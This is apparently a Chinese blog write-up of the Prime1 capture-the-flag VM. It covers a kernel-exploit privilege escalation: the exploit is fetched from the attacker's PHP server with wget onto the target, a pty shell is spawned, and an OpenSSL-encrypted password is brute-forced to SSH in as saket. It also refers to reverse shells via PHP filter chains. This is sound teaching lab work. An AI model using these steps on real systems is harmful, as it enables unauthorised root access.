+<p><code>www-data</code> 用户可以以 <strong>root 权限</strong> 运行 <code>/home/saket/enc</code> 这个脚本，<strong>而且不需要输入密码</strong>。</p>
+</blockquote>
+</blockquote>
+<h3 id="尝试提权-1"><a href="#尝试提权-1" class="headerlink" title="尝试提权"></a>尝试提权</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131949.png" alt="image-20251105210319093"></p>
+<p><strong>saket      victor</strong></p>
+<h3 id="saket-用户"><a href="#saket-用户" class="headerlink" title="saket 用户"></a>saket 用户</h3><p><strong>看看 saket 用户里面有什么</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135028786.png" alt="image-20251105210529712"></p>
+<p><strong>password.txt</strong> 里面就是我们之前最终找到的密码</p>
+<p><strong>user.txt</strong> 里面是 flag</p>
+<p><strong>enc 里面是什么呢？？？              因为之前许多都有****enc 的影子</strong>，我们试着读一下</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135029943.png" alt="image-20251105210821221"></p>
+<p><strong>不允许</strong></p>
+<p><strong>看一下他的属性</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135030161.png" alt="image-20251105210921690"></p>
+<p><strong>发现是****可执行的</strong></p>
+<p><strong>而之前提到的执行不需要密码，都联系在一起了</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131950.png" alt="image-20251105211005121"></p>
+<p><strong>看一下系统状态</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135030634.png" alt="image-20251105211104189"></p>
+<blockquote>
+<p><strong>自动任务无权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135030665.png" alt="image-20251105211226603"></p>
+</blockquote>
+<p><strong>可以看 passwd 但看不了 shadow</strong></p>
+<h2 id="系统内核漏洞提权"><a href="#系统内核漏洞提权" class="headerlink" title="系统内核漏洞提权"></a>系统内核漏洞提权</h2><p><strong>我们可以看到版本较低</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135031134.png" alt="image-20251105212052019"></p>
+<p><strong>searchsploit 搜一下该内核版本 Linux ubuntu 4.10.0-28   （因为服务器的 Linux 版本比较明确，而且小版本也都有）  -x 查看</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131951.png" alt="image-20251105212415833"></p>
+<p><strong>-m 下载到本地</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131952.png" alt="image-20251105212459100"></p>
+<p><strong>cat 读一下</strong><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135032322.png" alt="image-20251105212641509"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc xxx -o xxxxx</span><br><span class="line">编译 源文件 成 编译后的文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>需要编译，一般能本地编译（即在靶机里编译）就在本地，不行就编译好了再传过去</strong></p>
+<p><strong>然后上传到靶机</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131953.png" alt="image-20251105212820395"></p>
+<p><strong>本地开启 80 服务器，把我们的利用文件传上去</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo php -S 0:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135033150.png" alt="image-20251105213302661"></p>
+<p><strong>一般传到靶机的临时目录下</strong></p>
+<p><strong>wget 一般都有</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://本机地址:端口/文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131954.png" alt="image-20251105213343835"></p>
+<p><strong>看一下权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131955.png" alt="image-20251105213546873"></p>
+<p><strong>虽然没有执行权限，但是可以改的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 45010 </span><br><span class="line">对xx文件赋予执行权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131956.png" alt="image-20251105213641363"></p>
+<p><strong>kali 上编译的使用报错</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135034243.png" alt="image-20251105213914928"></p>
+<p><strong>本地编译正常</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135034285.png" alt="image-20251105213752696"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135035229.png" alt="image-20251105213821429"></p>
+<p><strong>看是否提权成功</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135035897.png" alt="image-20251105214117800"></p>
+<p><strong>提权成功</strong></p>
+<p><strong>获得完整交互式 shell（有 python）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135035899.png" alt="image-20251105214208397"></p>
+<p><strong>root 用户的 flag</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135035957.png" alt="image-20251105214329606"></p>
+<p><strong>定妆照</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135036001.png" alt="image-20251105214415681"></p>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135036253.png" alt="image-20251104211828094"></p>
+<h2 id="其他解法！！！！"><a href="#其他解法！！！！" class="headerlink" title="其他解法！！！！"></a>其他解法！！！！</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131957.png" alt="image-20251105215229061"></p>
+<p><strong>我在这里提供一个非预期解，通过构造 Filter 链可以直接执行命令和反弹 shell(反弹 shell 命令要 url 编码)，以来绕过&#x2F;wordpress 渗透，具体可以参考我的博客:</strong><a target="_blank" rel="noopener" href="https://sunrtwang.github.io/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/">https://sunrtwang.github.io/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/</a></p>
+<h1 id="Prime1-搞懂-OpenSSL-解密渗透提权-解法二"><a href="#Prime1-搞懂-OpenSSL-解密渗透提权-解法二" class="headerlink" title="Prime1 - 搞懂 OpenSSL 解密渗透提权-解法二"></a>Prime1 - 搞懂 OpenSSL 解密渗透提权-<strong>解法二</strong></h1><p><strong>通常情况****不会优先考虑</strong>系统提权，虽然比较快比较方便，但是比较暴力。缺点：很容易导致系统运行服务的中断不稳定</p>
+<p><strong>我们刚找到一个立足点（初级 shell），系统提权导致重启，或者管理员发现修复</strong></p>
+<p><strong>我们还是从初级系统权限开始</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135038093.png" alt="image-20251106191014222"></p>
+<h2 id="提权枚举"><a href="#提权枚举" class="headerlink" title="提权枚举"></a>提权枚举</h2><p><strong>看看还有哪些其他方式做系统提权</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135038663.png" alt="image-20251106191944572"></p>
+<p><strong>之前提到过的第二个看起来很有说法</strong></p>
+<p><strong>提权时一定要 <strong><code>sudo -l</code> 看一下</strong>当前用户的权限</strong></p>
+<h2 id="ENC-探索与查找"><a href="#ENC-探索与查找" class="headerlink" title="ENC 探索与查找"></a>ENC 探索与查找</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131958.png" alt="image-20251106192121161"></p>
+<h3 id="什么是-enc"><a href="#什么是-enc" class="headerlink" title="什么是 enc"></a>什么是 enc</h3><blockquote>
+<p><code>enc</code> 只是告诉你“我被加密了”，<strong>它不是单一格式</strong>；** <strong>想打开它，先搞清楚</strong>谁加的密、用的什么钥匙**，再选对应工具&#x2F;命令解密即可。</p>
+<table>
+<thead>
+<tr>
+<th><strong>场景</strong></th>
+<th><strong>典型工具</strong></th>
+<th><strong>加密&#x2F;解密示例</strong></th>
+<th><strong>说明</strong></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>手工加密 Shell 脚本</strong></td>
+<td><strong>OpenSSL</strong></td>
+<td><code>openssl aes-256-cbc -salt -pbkdf2 -in x.sh -out x.sh.enc</code></td>
+<td><strong>解密：</strong><code>openssl -d …</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>备份&#x2F;打包</strong></td>
+<td><strong>tar + openssl</strong></td>
+<td>`<strong>tar czf - pics&#x2F;</strong></td>
+<td><strong>openssl … &gt; pics.tar.gz.enc</strong>`</td>
+<td><strong>先打包再整体加密</strong></td>
+</tr>
+<tr>
+<td><strong>网盘同步</strong></td>
+<td><strong>百度网盘 Windows 客户端</strong></td>
+<td><strong>客户端里勾选了“加密备份到网盘”</strong></td>
+<td><strong>只能用****官方客户端</strong>输入密码还原，Linux 下无解</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>压缩工具</strong></td>
+<td><strong>7-Zip &#x2F; AxCrypt</strong></td>
+<td><strong>加密时自动添加</strong><code>.enc</code> 或 <code>.axx</code></td>
+<td><strong>用对应软件输入密码即可</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>脚本“编译”</strong></td>
+<td><strong>shc</strong></td>
+<td><code>shc -f script.sh</code> 生成 <code>script.sh.x</code> 后，有人再手动改后缀为 <code>.enc</code></td>
+<td><strong>实际是二进制壳，可用</strong><code>unshc</code> 尝试反解（老版本 shc 有效）</td>
+<td></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131959.png" alt="image-20251106192133865"></p>
+<p><strong>enc 是一个可执行文件，执行后需要密码</strong></p>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><code>./enc</code></th>
+<th><strong>执行当前目录下的可执行文件****enc</strong>。</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+</table>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131960.png" alt="image-20251106192354328"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131961.png" alt="image-20251106192432155"></p>
+<blockquote>
+<ul>
+<li><code>strings</code> 是一个 Linux 工具，用来<strong>从二进制文件中提取可打印的字符串</strong>（通常是 ASCII 文本），常用于分析未知文件或恶意软件。</li>
+<li><code>Permission denied</code> 表示：<strong>当前用户没有权限读取这个文件</strong>。</li>
+</ul>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135040682.png" alt="image-20251106192928456"></p>
+<p><strong>而本目录下的 passwd 之前用于登录 wordpress 了。不是这里的密码</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131962.png" alt="image-20251106193043369"></p>
+<blockquote>
+<p><code>file</code> 命令告诉你：<code>enc</code> 是一个<strong>可执行文件</strong>，但 <strong>www-data 用户无法读取它</strong>（没有读权限）。</p>
+</blockquote>
+<p><strong>怎么找密码呢？？</strong></p>
+<p><strong>学渗透一定设计密码学，而****openssl 里面就涉及 enc</strong> 找一下·</p>
+<h3 id="find-技巧"><a href="#find-技巧" class="headerlink" title="find 技巧"></a>find 技巧</h3><p><strong>一会再看 openssl</strong></p>
+<p>**先考虑最直接的怎么找密码，由于是靶机实验，密码很可能存在。找的  **<strong>find 技巧</strong>     <strong>备份 backup&#x2F;密码 passw</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;*backup*&#x27; 2&gt;/dev/null |sort | less</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135041356.png" alt="image-20251106194130202"></p>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>命令片段</strong></th>
+<th><strong>作用</strong></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find /</code></td>
+<td>**从根目录<code>/</code>**开始递归查找整个文件系统。</td>
+<td></td>
+</tr>
+<tr>
+<td><code>-name &#39;*backup*&#39;</code></td>
+<td>*<em>查找</em>***文件名或目录名中包含 “backup”**的项（前后都有<code>*</code>，表示任意字符）。 <strong>例：</strong><code>backup.tar.gz</code>、<code>my_backup_folder</code>、<code>old_backup.sql</code> 都会被匹配。</td>
+<td></td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td><strong>把错误输出（如“权限被拒绝”）重定向到</strong><code>/dev/null</code>，即<strong>不显示错误信息</strong>，避免干扰。</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>sort</strong></td>
+<td><strong>将查找结果按****字典序排序</strong>，方便浏览。</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>less</strong></td>
+<td><strong>使用分页器</strong><code>less</code> 显示结果，支持上下翻页、搜索（按 <code>/</code>）、退出（按 <code>q</code>）。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<blockquote>
+<p><strong>（由于权限低，很多是会报错的）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135041359.png" alt="image-20251106193951833"></p>
+</blockquote>
+<p><strong>不带扩展名</strong>的，还有<strong>扩展名是 txt 的</strong>都是比较有意义的；或者<strong>看目录</strong>，比如 help 目录就没什么意义</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131963.png" alt="image-20251106194639257"><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135042202.png" alt="image-20251106194841437"></p>
+<p><strong>尝试获取或拷贝都不被允许</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135042272.png" alt="image-20251106195023592"></p>
+<p><strong>获得密码</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131964.png" alt="image-20251106195340424"></p>
+<blockquote>
+<p><code>drwxr</code> 是 <code>ls -l</code> 列出文件权限时的一种<strong>开头片段</strong>，它只显示了<strong>前 5 个字符</strong>，完整权限应该是 <strong>10 个字符</strong>。你看到的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxr</span><br></pre></td></tr></table></figure>
+
+<p><strong>其实是：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x  （或其他组合，如 drwxrwxr--）</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><strong>字符</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>d</code></td>
+<td><strong>表示这是一个****目录（directory）</strong></td>
+</tr>
+<tr>
+<td><code>r</code></td>
+<td><strong>文件</strong>****所有者（owner）**<strong>有</strong>读（read）**<strong>权限</strong></td>
+</tr>
+<tr>
+<td><code>w</code></td>
+<td><strong>所有者有</strong>**<strong>写（write）</strong>**<strong>权限</strong></td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td><strong>所有者有</strong>**<strong>执行（execute）</strong>**<strong>权限（对目录来说，是“进入”权限）</strong></td>
+</tr>
+<tr>
+<td><code>r-x</code></td>
+<td>**<strong>所属组（group）</strong>****有读和执行权限，**<strong>没有写权限</strong></td>
+</tr>
+<tr>
+<td><code>r-x</code></td>
+<td>**<strong>其他用户（others）</strong>****也有读和执行权限，**<strong>没有写权限</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<h3 id="执行-enc"><a href="#执行-enc" class="headerlink" title="执行 enc"></a>执行 enc</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135043229.png" alt="image-20251106200525449"></p>
+<p><strong>发现打出一个 good 后，看起来什么都没有发生。</strong></p>
+<p>**怎么看发生了什么呢，**<strong>肯定是回到该文件的目录下看</strong>，这是正常的思路</p>
+<p><strong>回到 saket 目录下，发现多了两个文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131965.png" alt="image-20251106200725160"></p>
+<h2 id="ENC-破解"><a href="#ENC-破解" class="headerlink" title="ENC 破解"></a>ENC 破解</h2><p><strong>可以看到 enc.txt 和 key.txt 的内容</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131966.png" alt="image-20251106201305154"></p>
+<blockquote>
+<p>**图中文字‘ippsec’ → <strong><strong>MD5 口令</strong> → <strong>OpenSSL 解密</strong> → 拿到真实内容。</strong> **这就是它和 OpenSSL 的“联系”：MD5 提供钥匙，OpenSSL 负责开门。</p>
+</blockquote>
+<p><strong>先转换成 md5 值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo echo -n &#x27;ippsec&#x27; | md5sum   生成md5时，一定要加上-n，否则输出结果有误！！！</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131967.png" alt="image-20251106201925720"></p>
+<p>**-n 表示不换行输出 **</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135044594.png" alt="image-20251106201609964"></p>
+<p><strong>使用****echo 时</strong>，对于只看字面文本时无所谓。如果涉及字节级的操作时，<strong>一定不要落下-n</strong>。</p>
+<blockquote>
+<p><strong>只要你的下一步操作****依赖字节精确性</strong>，就一定用** <strong><code>echo -n &#39;字符串&#39;</code> 或 <code>printf &#39;字符串&#39;</code>（<code>printf</code> 默认不加换行）。</strong> **<strong>别落下 <code>-n</code></strong>，否则调试时连哈希都对不上，还以为是算法错了！</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135045494.png" alt="image-20251106202840305"></p>
+<p><strong>’优雅‘的干掉后面的空格，涉及****awk 的使用</strong></p>
+<blockquote>
+<p><code>awk</code> 是 Linux 文本处理“瑞士军刀”，<strong>核心功能</strong> 可浓缩成 6 句话：</p>
+<ol>
+<li><strong>列切割</strong> – 自动按空格&#x2F;TAB 切行成 <code>$1</code> <code>$2</code> … <code>$NF</code></li>
+<li><strong>列运算</strong> – 支持 <code>+ - * / % ++ --</code> 与 C 风格变量</li>
+<li><strong>条件过滤</strong> – 模式在前 <code>&#123;动作&#125;</code> 在后，不写 <code>&#123;print&#125;</code> 默认整行输出</li>
+<li><strong>正则匹配</strong> – <code>/regex/</code> 直接当条件，支持 <code>~ !~</code></li>
+<li><strong>聚合统计</strong> – <code>BEGIN&#123;&#125; END&#123;&#125;</code> 做计数、求和、平均、去重</li>
+<li><strong>多文件&#x2F;多分隔符</strong> – <code>-F&#39;:&#39;</code> 指定分隔符，<code>FNR==NR</code> 区分两个文件</li>
+</ol>
+<hr>
+<h3 id="一张速查表（够用-90-场景）"><a href="#一张速查表（够用-90-场景）" class="headerlink" title="一张速查表（够用 90 % 场景）"></a>一张速查表（够用 90 % 场景）</h3><table>
+<thead>
+<tr>
+<th><strong>任务</strong></th>
+<th><strong>一行示例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>打印第 1、3 列</strong></td>
+<td><code>awk &#39;&#123;print $1,$3&#125;&#39; file</code></td>
+</tr>
+<tr>
+<td><strong>指定分隔符</strong></td>
+<td><code>awk -F: &#39;&#123;print $1&#125;&#39; /etc/passwd</code></td>
+</tr>
+<tr>
+<td><strong>过滤行</strong></td>
+<td><code>awk &#39;$3 &gt; 80 &#123;print $0&#125;&#39; score.txt</code></td>
+</tr>
+<tr>
+<td><strong>正则匹配</strong></td>
+<td><code>awk &#39;/Failed/ &#123;print $1&#125;&#39; /var/log/auth.log</code></td>
+</tr>
+<tr>
+<td><strong>计数</strong></td>
+<td><code>awk &#39;END&#123;print NR&#125;&#39; file</code></td>
+</tr>
+<tr>
+<td><strong>求和</strong></td>
+<td><code>awk &#39;&#123;s+=$2&#125; END&#123;print s&#125;&#39; file</code></td>
+</tr>
+<tr>
+<td><strong>去重</strong></td>
+<td><code>awk &#39;!a[$0]++&#39; file</code></td>
+</tr>
+<tr>
+<td><strong>两个文件对比</strong></td>
+<td><code>awk &#39;FNR==NR&#123;a[$1];next&#125; $1 in a&#39; file1 file2</code></td>
+</tr>
+<tr>
+<td><strong>添加列</strong></td>
+<td><code>awk &#39;&#123;$4=$2*$3; print&#125;&#39; file</code></td>
+</tr>
+<tr>
+<td><strong>列拼接字符串</strong></td>
+<td><code>awk &#39;&#123;print &quot;user:&quot; $1 &quot;, uid:&quot; $3&#125;&#39; /etc/passwd</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="记忆口诀"><a href="#记忆口诀" class="headerlink" title="记忆口诀"></a>记忆口诀</h3><blockquote>
+<p><strong>“模式动作成对，列用 <code>$</code> 号，BEGIN 先走，END 后扫，正则斜杠包，数组去重宝。”</strong></p>
+</blockquote>
+<p><strong>掌握这几句，日常日志分析、报表生成、数据清洗都能一把梭。</strong></p>
+</blockquote>
+<h2 id="OpenSSL-破解语句"><a href="#OpenSSL-破解语句" class="headerlink" title="OpenSSL 破解语句"></a>OpenSSL 破解语句</h2><p><strong>想明白“为什么要用 openssl 来解决”  因为给了 enc 和 key</strong></p>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>作用</strong></th>
+<th><strong>解密时是否必须</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-d</code></td>
+<td><strong>解密模式</strong>（缺省是加密）</td>
+<td><strong>✅ 必须加</strong></td>
+</tr>
+<tr>
+<td><code>-a</code>&#x2F;<code>-base64</code></td>
+<td><strong>输入&#x2F;输出****做 base64 编解码</strong> <strong>（密文是文本格式时用，文件头</strong><code>U2FsdGVk</code> 就是 base64 特征）</td>
+<td><strong>✅ 只有加密时用了</strong><code>-a</code>，解密才要加</td>
+</tr>
+<tr>
+<td><code>-Cipher</code></td>
+<td><strong>指定****对称算法 + 模式</strong>，例如 <code>-aes-256-cbc</code>、<code>-des-bc</code>、<code>-bf-cbc</code> 等</td>
+<td><strong>✅ 必须与加密时****完全一致</strong></td>
+</tr>
+<tr>
+<td><code>-k &lt;密码&gt;</code></td>
+<td><strong>提供****口令</strong>（password-based 派生密钥） <strong>可写</strong><code>-k pass:明文</code> 或 <code>-k file:路径</code> 或 <code>-k env:变量</code></td>
+<td><strong>✅ 密码必须相同</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131968.png" alt="image-20251106210330090"></p>
+<p><strong>先把能写的参数写上</strong></p>
+<h3 id="CipherType-参数"><a href="#CipherType-参数" class="headerlink" title="-CipherType 参数"></a>-CipherType 参数</h3><p><strong>-help</strong></p>
+<blockquote>
+<ol>
+<li><strong>Standard commands</strong> <strong>标准命令（功能最全、日常用得最多）</strong></li>
+<li><strong>Message Digest commands</strong> <strong>消息摘要（哈希）命令</strong></li>
+<li><strong>Cipher commands</strong> <strong>对称加密算法命令</strong></li>
+</ol>
+<p><strong>OpenSSL 把功能拆成“标准命令 + 哈希别名 + 加密别名”三大块；日常记住 <code>enc(标准命令里面有)</code>、<code>dgst</code>、<code>req</code>、<code>x509</code>、<code>s_client</code> 这五个命令就能解决 90 % 的证书与加解密任务。</strong></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131969.png" alt="image-20251106203806049"></p>
+<p><strong>接下来用 key 解出 enc 里的内容</strong></p>
+<p><strong>我们首先要确定 enc 里面的密文是那种加密，爆破一下：</strong></p>
+<p><strong>先把所有可能的加密做成字典，复制上面提到的 -help 中的</strong><code>消息摘要（哈希）</code> 和 <code>对称加密算法</code> 去掉空行和首行分类名</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135045941.png" alt="image-20251106204154626"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135046024.png" alt="image-20251106204419405"></p>
+<p><strong>然后把所有数据分为一个占一行</strong></p>
+<p><strong>gsub 替换所有的空格替换成换行符，然后排序（这时空行还是存在），然后取唯一。wc -l 是计数</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135046020.png" alt="image-20251106205015730"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135047264.png" alt="image-20251106204838597"></p>
+<p><strong>将最终结果存到指定文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135047684.png" alt="image-20251106205116574"></p>
+<h3 id="K-参数"><a href="#K-参数" class="headerlink" title="-K 参数"></a>-K 参数</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131970.png" alt="image-20251106205509949"></p>
+<p><strong>因为需要 16 进制，具体命令如下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131971.png" alt="image-20251106210220670"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131972.png" alt="image-20251106210526636"></p>
+<p><strong>至此-K 参数完成</strong></p>
+<h2 id="bash-脚本-For-循环"><a href="#bash-脚本-For-循环" class="headerlink" title="bash 脚本 For 循环"></a>bash 脚本 For 循环</h2><p>**openssl 的 bug   ****-n 和 没有都试一下**</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135048495.png" alt="image-20251106211429523"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135049357.png" alt="image-20251106211602353"></p>
+<p><strong>发现有意义的语句了</strong></p>
+<p><strong>去掉错误信息，并且输出当前使用的加密方式</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135050178.png" alt="image-20251106211926587"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131973.png" alt="image-20251106212027245"></p>
+<p><strong>找到所用的加密算法了</strong></p>
+<p><strong>验证一下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131974.png" alt="image-20251106212155357"></p>
+<p><strong>这是密码</strong></p>
+<h2 id="ssh-连接"><a href="#ssh-连接" class="headerlink" title="ssh 连接"></a>ssh 连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh saket@10.10.10.22</span><br><span class="line">密码：tribute_to_ippsec</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131975.png" alt="image-20251106212712310"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131976.png" alt="image-20251106213013016"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135052260.png" alt="image-20251106213043827"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="尝试提权-2"><a href="#尝试提权-2" class="headerlink" title="尝试提权"></a>尝试提权</h2><p>**看当前用户权限 **<code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135052394.png" alt="image-20251106213226762"></p>
+<p><strong>还是无密码的执行，试试</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135052581.png" alt="image-20251106213335586"></p>
+<p><strong>他说没有，那就建一个，难道是可以以 root 权限执行 challenge 这个文件？？</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131977.png" alt="image-20251106213629464"></p>
+<p><strong>注意这里是单引号   这里 deny 是因为没有执行权限（我们建好一个文件时，要记得加执行权限）</strong><code>chmod +x challenge</code></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131978.png" alt="image-20251106213807699"></p>
+<blockquote>
+<ol>
+<li><code>#!/bin/bash</code> 写在脚本文件<strong>第一行</strong>，告诉内核“用哪个解释器执行我”。</li>
+<li><code>/bin/bash</code> 是一个<strong>可执行程序路径</strong>，手工在命令行敲它时，只是“启动一个新的 bash 进程”。</li>
+</ol>
+<hr>
+<h3 id="一、-bin-bash（shebang-hash-bang）"><a href="#一、-bin-bash（shebang-hash-bang）" class="headerlink" title="一、#!/bin/bash（shebang &#x2F; hash-bang）"></a>一、<code>#!/bin/bash</code>（shebang &#x2F; hash-bang）</h3><ul>
+<li><strong>出现位置</strong>：必须是脚本文件<strong>最顶端</strong>那一行。</li>
